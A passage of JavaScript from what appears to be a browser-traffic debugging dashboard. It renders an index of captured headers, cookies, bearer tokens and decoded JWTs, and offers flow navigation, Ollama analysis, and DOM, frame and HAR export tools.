  // Drop whole sections that don't apply to the chosen direction.
  const allSections=[
    ['Decoded JWTs',      'decodedJwts',  idx.decodedJwts,  null],
    ['Request headers',   'reqHeaders',   idx.reqHeaders,   'req'],
    ['Response headers',  'respHeaders',  idx.respHeaders,  'resp'],
    ['Cookies',           'cookies',      idx.cookies,      null],
    ['Bearer tokens',     'bearerTokens', idx.bearerTokens, null],
    ['Request body fields','bodyFields',  idx.bodyFields,   'req'],
  ];
  const sections=allSections.filter(([,,,dir])=>dirFilter==='all'||dir==null||dir===dirFilter)
    .map(([t,g,d])=>[t,g,d]);
  const matchDir=(o)=>{
    if(dirFilter==='all')return true;
    return o.dir==='both' || o.dir===dirFilter;
  };
  const matchSite=(o)=>!siteFilter||(o.hosts && o.hosts.has(siteFilter));
  const match=(o)=>(!q||o.name.toLowerCase().includes(q)||o.value.toLowerCase().includes(q))&&matchDir(o)&&matchSite(o);

  let total=0, totalIgnored=0;
  const container=document.getElementById('idx-sections');
  container.innerHTML=sections.map(([title,group,data])=>{
    const entriesAll=Object.entries(data).filter(([,o])=>match(o));
    const items=entriesAll.filter(([,o])=>showIgnored||!isIgnoredName(o.name))
      .sort((a,b)=>b[1].seqs.length-a[1].seqs.length);
    const sectionIgnored=entriesAll.length-items.length+(showIgnored?entriesAll.filter(([,o])=>isIgnoredName(o.name)).length:0);
    const visibleCount=items.length;
    const hiddenInThisSection=entriesAll.filter(([,o])=>isIgnoredName(o.name)).length;
    total+=showIgnored?items.filter(([,o])=>!isIgnoredName(o.name)).length:visibleCount;
    totalIgnored+=hiddenInThisSection;
    const managerOpen=_idxManagerOpen();

    // Per-value row renderer — shared between "group by name" and "group by site".
    // In site-mode we show the name inline (since the group header is a host),
    // in name-mode we omit it (the group header is already the name).
    function _idxValueRow(key, o, showName){
      const selected=(idxSelectedKey===group+'␟'+key)?' selected':'';
      const subIgnored=isIgnoredName(o.name);
      const rowStyle=subIgnored?' style="opacity:.45"':'';
      const seqs=o.seqs.slice(0,30).map(s=>`<span class="idx-seq-chip" onclick="event.stopPropagation();jumpToSeq(${s})">#${s}</span>`).join('');
      const more=o.seqs.length>30?` <span style="color:#64748b;font-size:11px">+${o.seqs.length-30}</span>`:'';
      const keyEsc=esc(key).replace(/'/g,"&#39;").replace(/\\u241F/g,'\\u241F');
      const nameEscInner=esc(o.name).replace(/'/g,"&#39;");
      const groupEsc=esc(group).replace(/'/g,"&#39;");
      const fullKey=group+'␟'+key;
      const flagged=idxFlaggedItems.has(fullKey);
      const cbChecked=managerOpen?false:flagged;
      const cbTitle=managerOpen
        ? 'Value-level ignore not supported — use the group header or the Manage ignore list panel'
        : `Flag this value — red dot on ${o.seqs.length} matching transaction${o.seqs.length===1?'':'s'}`;
      const cbDisabled=managerOpen?'disabled':'';
      const cbStyle=managerOpen
        ? 'margin:2px 6px 0 0;cursor:not-allowed;opacity:.4'
        : 'margin:2px 6px 0 0;cursor:pointer;accent-color:#ef4444';
      const cb=`<input type="checkbox" ${cbDisabled} onclick="event.stopPropagation();idxCheckboxClicked(this,'${nameEscInner}','${groupEsc}','${keyEsc}')" ${cbChecked?'checked':''} title="${cbTitle}" style="${cbStyle}">`;
      const namePart=showName?`<span class="idx-item-name">${esc(o.name)}</span>`:'';
      return `<div class="idx-item idx-sub${selected}"${rowStyle} onclick="selectIndexItem('${esc(group)}','${esc(key).replace(/\\u241F/g,'\\u241F')}')">
        ${cb}
        ${namePart}
        <span class="idx-item-val">${esc(o.value)}</span>
        <span class="idx-item-seqs">${seqs}${more}</span>
      </div>`;
    }

    let rows='';
    if(groupBy==='site'){
      // Group by host. An item can appear under multiple hosts when it was
      // seen on several (e.g. a Bearer token echoed across subdomains).
      const byHost=new Map();
      for(const [key,o] of items){
        const hosts=o.hosts && o.hosts.size?[...o.hosts]:['(unknown)'];
        for(const h of hosts){
          if(!byHost.has(h))byHost.set(h,[]);
          byHost.get(h).push([key,o]);
        }
      }
      const groupsSorted=[...byHost.entries()].sort((a,b)=>{
        const cov=arr=>new Set(arr.flatMap(([,o])=>o.seqs)).size;
        return cov(b[1])-cov(a[1]);
      });
      rows=groupsSorted.length?groupsSorted.map(([host, vars])=>{
        const unionSeqs=new Set(vars.flatMap(([,o])=>o.seqs));
        const collapseKey=group+'|site|'+host;
        const collapsed=idxCollapsedGroups.has(collapseKey);
        const caret=collapsed?'▶':'▼';
        const collapseKeyEsc=collapseKey.replace(/'/g,"&#39;");
        const meta=`${vars.length} item${vars.length===1?'':'s'} · ${unionSeqs.size} txn${unionSeqs.size===1?'':'s'}`;
        const subRows=vars.map(([key,o])=>_idxValueRow(key,o,true)).join('');
        const bodyHtml=collapsed?'':`<div class="idx-group-body">${subRows}</div>`;
        return `<div class="idx-group">
          <div class="idx-group-head">
            <span class="idx-gcaret" onclick="event.stopPropagation();idxToggleGroup('${collapseKeyEsc}')" title="${collapsed?'Expand':'Collapse'}">${caret}</span>
            <span class="idx-gname" style="color:#7dd3fc">${esc(host)}</span>
            <span class="idx-gmeta">${meta}</span>
          </div>
          ${bodyHtml}
        </div>`;
      }).join(''):'<div class="idx-empty">(none)</div>';
    } else {
      // Default: group by name (original behaviour).
      const byName=new Map();
      for(const [key,o] of items){
        if(!byName.has(o.name))byName.set(o.name,[]);
        byName.get(o.name).push([key,o]);
      }
      const groupsSorted=[...byName.entries()].sort((a,b)=>{
        const cov=arr=>new Set(arr.flatMap(([,o])=>o.seqs)).size;
        return cov(b[1])-cov(a[1]);
      });
      rows=groupsSorted.length?groupsSorted.map(([name, variants])=>{
        const nameEsc=esc(name).replace(/'/g,"&#39;");
        const groupEsc=esc(group).replace(/'/g,"&#39;");
        const ignored=isIgnoredName(name);
        const unionSeqs=new Set(variants.flatMap(([,o])=>o.seqs));
        const flaggedHere=variants.filter(([k])=>idxFlaggedItems.has(group+'␟'+k)).length;
        const allFlagged=variants.length>0 && flaggedHere===variants.length;
        const someFlagged=flaggedHere>0 && flaggedHere<variants.length;
        const headCbChecked=managerOpen?ignored:allFlagged;
        const headCbTitle=managerOpen
          ? `Add '${esc(name)}' to ignore list (hides all values with this name)`
          : `Flag all ${variants.length} value${variants.length===1?'':'s'} with this name`;
        const headCbStyle=managerOpen
          ? 'margin:0;cursor:pointer'
          : 'margin:0;cursor:pointer;accent-color:#ef4444';
        const headCb=`<input type="checkbox" onclick="event.stopPropagation();idxGroupClicked(this,'${nameEsc}','${groupEsc}')" ${headCbChecked?'checked':''} ${someFlagged?'data-indeterminate="1"':''} title="${headCbTitle}" style="${headCbStyle}">`;
        const meta=`${variants.length} unique value${variants.length===1?'':'s'} · ${unionSeqs.size} txn${unionSeqs.size===1?'':'s'}${someFlagged?` · ${flaggedHere} flagged`:''}`;
        const subRows=variants.map(([key,o])=>_idxValueRow(key,o,false)).join('');
        const collapseKey=group+'|'+name;
        const collapsed=idxCollapsedGroups.has(collapseKey);
        const caret=collapsed?'▶':'▼';
        const collapseKeyEsc=collapseKey.replace(/'/g,"&#39;");
        const bodyHtml=collapsed?'':`<div class="idx-group-body">${subRows}</div>`;
        return `<div class="idx-group">
          <div class="idx-group-head${ignored?' ignored':''}">
            <span class="idx-gcaret" onclick="event.stopPropagation();idxToggleGroup('${collapseKeyEsc}')" title="${collapsed?'Expand':'Collapse'}">${caret}</span>
            ${headCb}
            <span class="idx-gname">${esc(name)}</span>
            <span class="idx-gmeta">${meta}</span>
          </div>
          ${bodyHtml}
        </div>`;
      }).join(''):'<div class="idx-empty">(none)</div>';
    }
    const hiddenNote=(!showIgnored && hiddenInThisSection>0)
      ? `<span style="color:#64748b;font-size:11px;margin-left:6px">(${hiddenInThisSection} hidden)</span>`:'';
    return `<div class="idx-section">
      <h4>${title}<span class="idx-count">${visibleCount}</span>${hiddenNote}</h4>
      ${rows}
    </div>`;
  }).join('');
  const extra=[];
  if(totalIgnored>0 && !showIgnored)extra.push(`${totalIgnored} hidden by ignore list`);
  if(markersOnly && (m.start!=null || m.end!=null))extra.push(`markers seq ${m.start??'–'}..${m.end??'–'}`);
  if(siteFilter)extra.push(`site=${siteFilter}`);
  extra.push(`group=${groupBy}`);
  if(idxFlaggedItems.size)extra.push(`${idxFlaggedItems.size} flagged · ${idxActiveSeqs.size} seq${idxActiveSeqs.size===1?'':'s'} red-dotted`);
  extra.push(_idxManagerOpen()?'mode: ignore':'mode: flag (red dot)');
  document.getElementById('idx-count').textContent=`${total} item${total===1?'':'s'} · ${extra.join(' · ')}`;

  // Group-header checkboxes can't express "some but not all" via HTML — set
  // the indeterminate DOM property post-render for any we tagged.
  for(const cb of container.querySelectorAll('input[type="checkbox"][data-indeterminate="1"]')){
    cb.indeterminate=true;
  }
}

function selectIndexItem(group, key){
  idxSelectedKey=group+'␟'+key;
  idxCurrentSeqIdx=0;
  // Rebuild to refresh selection highlight
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const obj=(idx[group]||{})[key];
  if(!obj){renderIndex();return}
  // Add value as a taint so it highlights across Flow Trace
  addTaint(obj.value);
  // Auto-flag this item: the click is a user intent to highlight it. Keeps
  // any previously-flagged items in place (additive).
  idxFlaggedItems.add(idxSelectedKey);
  _idxRecomputeActiveSeqs();
  renderIndexDetail(obj);
  renderIndex();
  if(currentTab==='flow')renderFlow();
}

function renderIndexDetail(obj){
  const el=document.getElementById('idx-detail');
  const seqs=obj.seqs;
  const cur=seqs[idxCurrentSeqIdx]||seqs[0];
  const at=idxCurrentSeqIdx+1;
  // Decoded-JWT block: when this item carries a `dec` field, show the
  // header + claim summary + full payload so the analyst can read the
  // token without leaving the dashboard.
  let jwtBlock='';
  if(obj.dec){
    const p=obj.dec.payload||{};
    const h=obj.dec.header||{};
    const expClass=p._expired_ago?'color:#f87171':'color:#4ade80';
    const expText=p._expired_ago?`expired ${esc(p._expired_ago)} ago`:(p._expires_in?`expires in ${esc(p._expires_in)}`:'');
    const rows=[];
    const add=(label,val)=>{if(val!=null&&val!=='')rows.push(`<div><span style="color:#94a3b8">${esc(label)}:</span> <span style="color:#e2e8f0">${esc(String(Array.isArray(val)?val.join(', '):val))}</span></div>`)};
    add('alg', obj.dec.alg);
    add('typ', h.typ);
    add('iss', p.iss);
    add('aud', p.aud);
    add('sub', p.sub);
    add('upn', p.upn);
    add('email', p.email);
    add('preferred_username', p.preferred_username);
    add('tid', p.tid);
    add('oid', p.oid);
    add('appid', p.appid||p.azp||p.client_id);
    add('scp', p.scp||p.scope);
    if(Array.isArray(p.roles))add('roles', p.roles);
    add('amr', p.amr);
    if(p._iat_readable)add('iat', p._iat_readable);
    if(p._nbf_readable)add('nbf', p._nbf_readable);
    if(p._exp_readable)add('exp', p._exp_readable);
    jwtBlock=`<div style="background:#0a0a14;border:1px solid #1e3a5f;padding:8px;border-radius:3px;margin:0 0 10px 0">
      <div style="font-size:13px;color:#86efac;font-weight:600;margin-bottom:6px">Decoded JWT <span style="${expClass};font-weight:normal;margin-left:6px">${expText}</span></div>
      <div style="font-size:12px;line-height:1.5">${rows.join('')}</div>
      <details style="margin-top:8px"><summary style="color:#78859b;font-size:12px;cursor:pointer">Full header + payload</summary>
        <pre style="font-size:12px;color:#cbd5e1;margin:6px 0 0 0;max-height:240px;overflow:auto">${esc(JSON.stringify({header:h,payload:p},null,2))}</pre>
      </details>
    </div>`;
  }
  el.innerHTML=`
    <div style="font-size:13px;color:#7dd3fc;font-weight:600;margin-bottom:4px;word-break:break-all">${esc(obj.name)}</div>
    ${jwtBlock}
    <pre style="background:#0a0a14;border:1px solid #1f2937;padding:8px;border-radius:3px;font-size:12px;max-height:180px;overflow:auto;color:#cbd5e1;margin:0 0 10px 0">${esc(obj.value)}</pre>
    <div class="idx-nav">
      <button onclick="idxPrevSeq()" ${idxCurrentSeqIdx<=0?'disabled':''} title="Highlight the previous matching seq in this list (stays on Index)">◀ Prev</button>
      <span style="color:#94a3b8;font-size:12px">${at} / ${seqs.length}  ·  #${cur==null?'-':cur}</span>
      <button onclick="idxNextSeq()" ${idxCurrentSeqIdx>=seqs.length-1?'disabled':''} title="Highlight the next matching seq (stays on Index)">Next ▶</button>
      <button onclick="idxOpenInFlow()" title="Switch to Flow Trace — all matching rows red-dotted, only they plus ±3 shown">Open in Flow Trace</button>
    </div>
    <div style="font-size:12px;color:#94a3b8;margin-bottom:4px">Appears in ${seqs.length} transaction${seqs.length===1?'':'s'}:</div>
    <div style="display:flex;flex-wrap:wrap;gap:4px">
      ${seqs.map((s,i)=>`<span class="idx-seq-chip${i===idxCurrentSeqIdx?' current':''}" onclick="idxGoToSeqIdx(${i})" title="Focus this seq in the detail pane (stays on Index)">#${s}</span>`).join('')}
    </div>
    <div style="margin-top:14px;font-size:11px;color:#64748b">Prev/Next stays on this tab. Click <b>Open in Flow Trace</b> to jump — the "only flagged ±3" filter will auto-enable so all matching rows show up together.</div>
  `;
}

function idxOpenInFlow(){
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const [group,key]=_idxSplitFirst(idxSelectedKey||'');
  const obj=(idx[group]||{})[key];
  // Ensure idxActiveSeqs reflects every flagged item (not just this one) so
  // every red-dotted row shows up on Flow Trace.
  idxFlaggedItems.add(idxSelectedKey);
  _idxRecomputeActiveSeqs();
  // Auto-enable the "only flagged ±3" filter so the user sees all matches
  // on arrival instead of just one highlighted row.
  const tog=document.getElementById('flow-only-flagged');
  if(tog)tog.checked=true;
  // Pick a jump target: prefer the detail's current seq, else first flagged.
  let cur=null;
  if(obj && obj.seqs.length)cur=obj.seqs[idxCurrentSeqIdx]!=null?obj.seqs[idxCurrentSeqIdx]:obj.seqs[0];
  if(cur==null){const all=[...idxActiveSeqs].sort((a,b)=>a-b);cur=all[0]}
  if(cur==null){alert('No flagged transactions to open. Check a few items first.');return}
  jumpToSeq(cur);
}

function idxPrevSeq(){if(idxCurrentSeqIdx>0){idxCurrentSeqIdx--;_idxRefreshDetail(false)}}
function idxNextSeq(){
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const [group,key]=_idxSplitFirst(idxSelectedKey||'');
  const obj=(idx[group]||{})[key]; if(!obj)return;
  if(idxCurrentSeqIdx<obj.seqs.length-1){idxCurrentSeqIdx++;_idxRefreshDetail(false)}
}
function idxGoToSeqIdx(i){idxCurrentSeqIdx=i;_idxRefreshDetail(false)}

// Refresh the Index detail pane (counter, chips). If `jump` is true, also
// switch to Flow Trace and scroll-to the current seq — that's only wanted
// for the explicit "Open in Flow Trace" button, not for Prev/Next.
function _idxRefreshDetail(jump){
  const entries=flowBySession[idxSelectedSid]||[];
  const idx=buildIndex(entries);
  const [group,key]=_idxSplitFirst(idxSelectedKey||'');
  const obj=(idx[group]||{})[key]; if(!obj)return;
  renderIndexDetail(obj);
  if(jump){
    const cur=obj.seqs[idxCurrentSeqIdx];
    if(cur!=null)jumpToSeq(cur);
  }
}

function jumpToSeq(seq){
  if(seq==null)return;
  // Make sure the Flow Trace session selector matches our session, then jump.
  flowSelectedSid=idxSelectedSid;
  flowSelectedSeq=seq;
  const flowSel=document.getElementById('flow-sid-select');
  if(flowSel){
    // If the flow select doesn't have this sid yet, repopulate.
    if(![...flowSel.options].some(o=>o.value===idxSelectedSid)){refreshFlowSessionList()}
    flowSel.value=idxSelectedSid;
  }
  switchTab('flow');
  // Defer so the panel is visible before scroll
  setTimeout(()=>{
    const row=document.querySelector(`.flow-row:nth-child(${(flowBySession[flowSelectedSid]||[]).findIndex(e=>e.seq===seq)+1})`);
    if(row){row.scrollIntoView({block:'center'});row.classList.add('selected')}
    const entries=flowBySession[flowSelectedSid]||[];
    const entry=entries.find(e=>e.seq===seq);
    if(entry)renderFlowDetail(entry);
  },50);
}
// ── Tool action tracker ───────────────────────────────────────────
// Tool buttons (Analyze, Send to RAG, Dump DOM, Frames, Export Flow)
// flip into a `Running…` state while the action is in flight, then
// restore when the matching response arrives. Also emit a client-side
// log entry with timing so every tool run shows up in All Logs under
// the `tool` category, and we get a real audit trail of user actions.
const _toolButtonStates = {};    // key -> { btn, origText, origBg, startedAt }
const TOOL_WATCHDOG_MS = 60000;
function _toolStart(key, label, sid){
  const btn = (window.event && window.event.target) || null;
  const started = Date.now();
  const st = btn ? {
    btn,
    origText: btn.textContent,
    origDisabled: btn.disabled,
    startedAt: started,
  } : { startedAt: started };
  // Safety net: if no matching _toolEnd arrives (lost WS message, dropped
  // response), auto-reset the button instead of spinning forever.
  st.watchdog = setTimeout(() => {
    if(_toolButtonStates[key] === st){
      _toolEnd(key, false, 'timed out — no response (dashboard connection may be down; reload the page)');
    }
  }, TOOL_WATCHDOG_MS);
  _toolButtonStates[key] = st;
  if(btn){btn.textContent = 'Running…'; btn.disabled = true; btn.classList.add('running')}
  _clientLog('info', 'tool', `▶ ${label}${sid?' sid='+sid.slice(-10):''}`, sid||'');
}
function _toolEnd(key, ok, summary){
  const s = _toolButtonStates[key]; delete _toolButtonStates[key];
  if(s && s.watchdog) clearTimeout(s.watchdog);
  if(s && s.btn){
    s.btn.textContent = s.origText;
    s.btn.disabled = !!s.origDisabled;
    s.btn.classList.remove('running');
  }
  const ms = s ? (Date.now() - s.startedAt) : 0;
  const icon = ok ? '✓' : '✗';
  _clientLog(ok ? 'info' : 'warn', 'tool',
    `${icon} ${key} ${ms}ms${summary?' · '+summary:''}`);
}
// Push a log entry both to the local stream (immediate feedback) and to
// the backend so it lands in the shared log buffer (persists, visible in
// the All Logs tab and in the file logger if enabled).
function _clientLog(level, category, message, session_id){
  const entry = {
    type:'log', ts:Date.now()/1000, time:new Date().toTimeString().slice(0,8),
    level, category, message, session_id: session_id||'',
  };
  // Render immediately for snappy feedback.
  try{ addLog(entry) }catch(_){}
  // Echo to backend so it persists + other subscribers see it.
  send({cmd:'client_log', level, category, message, session_id: session_id||''});
}

function submitFlowToRag(){
  if(!flowSelectedSid){alert('Select a session first');return}
  const entries=flowBySession[flowSelectedSid]||[];
  if(!entries.length){
    alert('No flow entries captured for this session — nothing to send.');
    return;
  }
  _toolStart('Send to RAG', 'submit flow to RAG', flowSelectedSid);
  const picks=[..._flowPicks()];
  const m=flowMarkers[flowSelectedSid]||{};
  const payload={cmd:'submit_flow_to_rag',session_id:flowSelectedSid};
  if(picks.length)payload.seqs=picks;
  else{payload.start_seq=m.start;payload.end_seq=m.end}
  if(!send(payload)){
    _toolEnd('Send to RAG', false, 'not sent — dashboard WebSocket is disconnected');
    alert('Dashboard is not connected (WebSocket down). Reload the page and try again.');
  }
}
function analyzeFlow(){
  if(!flowSelectedSid){alert('Select a session first');return}
  // Don't ship an empty payload to Ollama — wastes a model round-
  // trip and produces a meaningless "no input" response. Same
  // reasoning whether the session has zero captured exchanges OR
  // the operator's marker / pick-set narrowed everything out.
  const entries=flowBySession[flowSelectedSid]||[];
  if(!entries.length){
    alert('No flow entries captured for this session yet.\n\n'
          +'Flow Trace is opt-in (default off since v1.6.0). Either:\n'
          +'  • open a new session at :8091 with ?trace=true\n'
          +'  • OR enable flow_trace_enabled in Settings\n'
          +'then interact with the page so it captures requests.');
    return;
  }
  const picks=[..._flowPicks()];
  const m=flowMarkers[flowSelectedSid]||{};
  // If the operator has picked rows OR set markers, make sure the
  // selection isn't empty after applying. Picks are explicit; marker
  // ranges that don't overlap any captured rows produce a 0-row
  // window the LLM can't help with.
  if(picks.length===0 && (m.start!=null || m.end!=null)){
    const inRange=entries.filter(e=>{
      if(m.start!=null && e.seq<m.start)return false;
      if(m.end!=null   && e.seq>m.end)  return false;
      return true;
    });
    if(!inRange.length){
      alert('Marker range covers no captured rows. Clear markers or set them on rows that exist.');
      return;
    }
  }
  const presetEl=document.getElementById('analyze-preset');
  const preset=presetEl?presetEl.value:'general';
  _toolStart('Analyze (Ollama)', `Ollama analysis preset=${preset}`, flowSelectedSid);
  const sid=flowSelectedSid;
  const body={session_id:sid,preset:preset};
  if(picks.length)body.seqs=picks;
  else{body.start_seq=m.start;body.end_seq=m.end}
  const _now=Date.now();
  _analysisInProgress[sid]={preset,startedAt:_now,lastActivity:_now};
  _analysisStream[sid]={text:'',preset:preset};
  _paintAnalysis(sid); renderTabs();
  // Streaming HTTP (NDJSON) instead of a WebSocket command: a fresh request
  // per run, so a backend restart fails cleanly (fetch errors) rather than
  // stranding a zombie socket — that was the analysis-hang class.
  // AbortController is the hard timeout.
  const ac=new AbortController();
  const _to=setTimeout(()=>{try{ac.abort()}catch(_){}}, 240000);
  const _finish=(msg)=>{
    clearTimeout(_to);
    delete _analysisInProgress[sid]; delete _analysisStream[sid];
    _lastAnalysis[sid]={msg:msg, at:Date.now()};
    if(currentTab==='flow'&&flowSelectedSid===sid)_paintAnalysis(sid);
    renderTabs();
    _toolEnd('Analyze (Ollama)', !!msg.ok, msg.ok?'done':(msg.error||'failed'));
  };
  (async()=>{
    try{
      const r=await apiFetch('/api/analyze-flow',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body),signal:ac.signal});
      if(!r.ok||!r.body){_finish({ok:false,error:'HTTP '+r.status+' from /api/analyze-flow'});return}
      const reader=r.body.getReader(); const dec=new TextDecoder(); let buf='';
      while(true){
        const rd=await reader.read();
        if(rd.done)break;
        buf+=dec.decode(rd.value,{stream:true});
        let nl;
        while((nl=buf.indexOf('\n'))>=0){
          const line=buf.slice(0,nl).trim(); buf=buf.slice(nl+1);
          if(!line)continue;
          let ev; try{ev=JSON.parse(line)}catch(_){continue}
          if(ev.type==='chunk'){
            const st=_analysisStream[sid]; if(st)st.text+=(ev.delta||'');
            const inf=_analysisInProgress[sid]; if(inf)inf.lastActivity=Date.now();
            if(currentTab==='flow'&&flowSelectedSid===sid)_paintAnalysis(sid);
          } else if(ev.type==='done'){ _finish(ev); return; }
          else if(ev.type==='error'){ _finish({ok:false,error:ev.error||'analysis error'}); return; }
        }
      }
      // stream closed without an explicit terminal event — keep what streamed
      const st=_analysisStream[sid];
      _finish({ok:true, analysis:(st&&st.text)||'', preset:preset});
    }catch(e){
      _finish({ok:false, error:(e&&e.name==='AbortError')?'Timed out (no response in 240s) — reload if the backend restarted, then retry.':('Request failed: '+((e&&e.message)||e))});
    }
  })();
  renderTabs();  // tab button picks up the spinner badge
}

// ── Session debug helpers ─────────────────────────────────────────
function _setFlowAi(html){const el=document.getElementById('flow-ai');if(el)el.innerHTML=html}
function debugDumpDom(){
  if(!flowSelectedSid){alert('Select a session first');return}
  _toolStart('Dump DOM', 'dump DOM', flowSelectedSid);
  _setFlowAi('<div class="flow-ai"><h3>DOM dump</h3><div style="color:#78859b">Writing…</div></div>');
  send({cmd:'debug_dump_dom', session_id: flowSelectedSid});
}
function debugListFrames(){
  if(!flowSelectedSid){alert('Select a session first');return}
  _toolStart('Frames', 'list frames', flowSelectedSid);
  _setFlowAi('<div class="flow-ai"><h3>Frames</h3><div style="color:#78859b">Enumerating…</div></div>');
  send({cmd:'debug_list_frames', session_id: flowSelectedSid});
}
function debugExportFlow(){
  if(!flowSelectedSid){alert('Select a session first');return}
  // Ask which format so Burp-Suite users can get a HAR directly instead of
  // having to convert afterwards. confirm() is intentionally blunt — two
  // clicks: OK = HAR, Cancel = JSON. (A full modal is overkill for a dev tool.)
  const fmt = confirm('Export as HAR 1.2 for Burp Suite import?\n\nOK  → HAR (.har, Burp / devtools import)\nCancel → raw JSON (internal format)') ? 'har' : 'json';
  // Trigger a native browser download instead of writing under
  // $DATA_DIR/debug on the server. The download endpoint streams with
  // Content-Disposition: attachment so a hidden <a download> click
  // saves directly to the operator's machine. The api_key is on the
  // query string because <a download> can't carry a Bearer header.
  // The WS-driven `debug_export_flow` command is still in place for
  // headless / automation callers who want a server-side file.
  const sid=encodeURIComponent(flowSelectedSid);
  const url=`/api/browser/session/${sid}/flow-export?format=${encodeURIComponent(fmt)}${_apiKey?'&api_key='+encodeURIComponent(_apiKey):''}`;
  const a=document.createElement('a');
  a.href=url;
  a.style.display='none';
  // Hint a filename — the server's Content-Disposition wins, but this
  // covers older browsers that ignore the header on same-origin GETs.
  a.download=`${flowSelectedSid}-flow.${fmt}`;
  document.body.appendChild(a);
  a.click();
  setTimeout(()=>a.remove(),1000);
  _toolStart('Export Flow', `export flow ${fmt.toUpperCase()}`, flowSelectedSid);
  _toolEnd('Export Flow', true, `${fmt.toUpperCase()} download triggered`);
  _setFlowAi(`<div class="flow-ai"><h3>Flow export (${fmt.toUpperCase()})</h3><div style="color:#78859b">Download triggered — check your browser's downloads.</div></div>`);
}
function _renderDebugDomResult(m){
  if(!m.ok){_setFlowAi(`<div class="flow-ai"><h3>DOM dump failed</h3><div style="color:#f87171">${esc(m.error||'')}</div></div>`);return}
  _setFlowAi(`<div class="flow-ai"><h3>DOM dumped</h3>
    <div><b>url:</b> ${esc(m.url||'')}</div>
    <div><b>title:</b> ${esc(m.title||'(none)')}</div>
    <div><b>file:</b> <code>${esc(m.path||'')}</code></div>
    <div><b>bytes:</b> ${m.bytes}</div>
    <div style="color:#78859b;font-size:12px;margin-top:6px">Open the file from a shell on the server — grep for input/button selectors you want to add to <code>config/sites.yaml</code>.</div>
  </div>`);
}
function _renderDebugFramesResult(m){
  if(!m.ok){_setFlowAi(`<div class="flow-ai"><h3>Frame enum failed</h3><div style="color:#f87171">${esc(m.error||'')}</div></div>`);return}
  const frames=m.frames||[];
  const rows=frames.map((f,i)=>{
    const formsHtml=(f.forms||[]).map(fm=>`
      <div style="margin:4px 0 4px 16px">
        <div style="color:#cbd5e1"><b>${esc(fm.method)}</b> ${esc(fm.action||'(no action)')}</div>
        <ul style="margin:2px 0 2px 22px;padding:0">${(fm.inputs||[]).map(inp=>`<li style="color:#94a3b8;font-size:12px">${esc(inp.tag)}${inp.type?'['+esc(inp.type)+']':''} ${inp.name?'name='+esc(inp.name)+' ':''}${inp.id?'id='+esc(inp.id):''}</li>`).join('')}</ul>
      </div>`).join('') || '<div style="color:#64748b;font-size:12px;margin-left:16px">(no forms)</div>';
    const btnsHtml=(f.buttons||[]).slice(0,12).map(b=>`<li style="color:#94a3b8;font-size:12px">${esc(b.tag)} ${b.id?'id='+esc(b.id)+' ':''}${b.data_value?'data-value='+esc(b.data_value)+' ':''}${b.text?'"'+esc(b.text)+'"':''}</li>`).join('');
    return `<div style="border-top:1px solid #222;padding:6px 0">
      <div><b style="color:#7dd3fc">Frame #${i}</b> ${f.name?' <span style="color:#94a3b8">name='+esc(f.name)+'</span>':''}</div>
      <div style="color:#cbd5e1;font-size:12px">${esc(f.url||'')}</div>
      <div style="margin-top:4px;color:#94a3b8;font-size:12px">forms:</div>
      ${formsHtml}
      ${btnsHtml?`<div style="margin-top:4px;color:#94a3b8;font-size:12px">buttons (first 12):</div><ul style="margin:2px 0 2px 22px;padding:0">${btnsHtml}</ul>`:''}
    </div>`;
  }).join('');
  _setFlowAi(`<div class="flow-ai"><h3>Frames (${frames.length})</h3>
    <div style="color:#78859b;font-size:12px;margin-bottom:6px">Top page: ${esc(m.url||'')}</div>
    ${rows||'<div style="color:#64748b">(no frames returned)</div>'}
  </div>`);
}
function _renderDebugFlowExport(m){
  if(!m.ok){_setFlowAi(`<div class="flow-ai"><h3>Flow export failed</h3><div style="color:#f87171">${esc(m.error||'')}</div></div>`);return}
  _setFlowAi(`<div class="flow-ai"><h3>Flow exported</h3>
    <div><b>entries:</b> ${m.entries}</div>
    <div><b>file:</b> <code>${esc(m.path||'')}</code></div>
    <div><b>bytes:</b> ${m.bytes}</div>
  </div>`);
}

// ── Flagged error banner ──
// Newest visible error persists until dismissed; arriving errors queue up
// at the top of flaggedErrors[] so the user can walk through recent ones.
let flaggedErrors=[];
function _renderFlaggedError(m){
  flaggedErrors.unshift(m);
  if(flaggedErrors.length>20)flaggedErrors.pop();
  _paintFlagBanner();
}
function _paintFlagBanner(){
  const el=document.getElementById('flag-banner');
  if(!el)return;
  if(!flaggedErrors.length){el.style.display='none';return}
  const m=flaggedErrors[0];
  const when=new Date((m.ts||0)*1000).toLocaleTimeString();
  const idp=m.idp?' <span style="color:#fda4af">['+esc(m.idp)+']</span>':'';
  const meaning=m.meaning?' — '+esc(m.meaning):'';
  const sidText=m.session_id?' sid='+esc(m.session_id.slice(0,20)):'';
  const body=esc(m.message||'');
  const seqText=(m.seq!=null)?` · <a href="javascript:void(0)" onclick="_flagJumpToFlow()" style="color:#fca5a5;text-decoration:underline">#${m.seq} in Flow Trace</a>`:' · <span style="color:#991b1b" title="Transaction seq not captured — probably filtered as noisy">(no flow row)</span>';
  const jumpBtn=(m.seq!=null && m.session_id)
    ? `<button class="btn" style="padding:2px 8px;font-size:11px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="_flagJumpToFlow()">jump to flow</button>`
    : '';
  el.style.display='flex';
  el.innerHTML=`
    <span style="font-size:16px">&#9888;</span>
    <div style="flex:1;font-family:'SF Mono',ui-monospace,monospace;font-size:12px">
      <b>${esc(m.code||'error')}</b> on ${esc(m.host||'?')} (HTTP ${m.status||'?'})${idp}${meaning}
      ${body?'<div style="color:#fecaca;margin-top:2px">'+body+'</div>':''}
      <div style="color:#991b1b;font-size:11px">${when}${sidText} · ${flaggedErrors.length} error${flaggedErrors.length===1?'':'s'} flagged${seqText}</div>
    </div>
    ${jumpBtn}
    <button class="btn" style="padding:2px 8px;font-size:11px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="_flagBannerPrev()" ${flaggedErrors.length<2?'disabled':''}>prev</button>
    <button class="btn" style="padding:2px 8px;font-size:11px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="_flagBannerDismiss()">dismiss</button>
    <button class="btn" style="padding:2px 8px;font-size:11px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="_flagBannerDismissAll()">clear all</button>
  `;
}
function _flagJumpToFlow(){
